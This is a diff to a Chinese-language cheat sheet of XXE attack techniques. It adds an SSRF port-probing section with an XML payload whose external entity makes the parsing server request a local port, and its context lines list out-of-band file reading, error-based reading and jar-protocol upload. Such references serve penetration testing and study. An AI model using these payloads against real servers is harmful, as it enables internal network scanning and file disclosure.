@@ -60,7 +60,8 @@ evil.dtd
   0x02 不带回显读取文件-OOB(Out of Band）    
   0x03 报错回显读取文件-XXE Base Error   
 - 0x04 远程执行
-- 0x05 文件上传-jar协议   
+- 0x05 端口探测
+- 0x06 文件上传-jar协议   
 
 ### 0x01回显读取文件
 #### payload   
@@ -189,8 +190,17 @@ PHP语言环境。
   <name>&xxe;</name>
 </root>
 ```
+### 0x05 SSRF端口探测
 
-### 0x05 文件上传-jar协议 
+```
+<?xml version = "1.0"?>
+<!DOCTYPE ANY [
+    <!ENTITY f SYSTEM "http://127.0.0.1:80">
+]>
+<x>&f;</x>
+```
+
+### 0x06 文件上传-jar协议 
 这篇文章：[一篇文章带你深入理解漏洞之 XXE 漏洞](https://xz.aliyun.com/t/3357)其中实验七有详细利用方法。   
 ### Tips
  - java 还支持一个 netdoc 协议，能完成列目录的功能   
